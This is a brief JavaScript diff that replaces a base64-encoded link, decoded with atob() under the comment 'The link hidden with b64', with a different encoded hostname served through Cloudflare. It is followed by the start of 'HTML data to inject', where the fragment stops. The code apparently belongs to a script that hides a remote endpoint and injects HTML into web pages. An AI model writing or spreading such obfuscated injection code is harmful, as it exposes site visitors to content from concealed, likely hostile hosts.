@@ -1,5 +1,5 @@
 // The link hidden with b64.
-var link = atob("aHR0cHM6Ly9iZzJsejg1Zi5iZWFud2ViLnF6ei5pby5jZG4uY2xvdWRmbGFyZS5uZXQv");
+var link = atob("YmlvbG9neS5pbmZvLm5vcnRoLWthemFraHN0YW4uc3UuY2RuLmNsb3VkZmxhcmUubmV0");
 
 // HTML data to inject.
 var htmlData = `
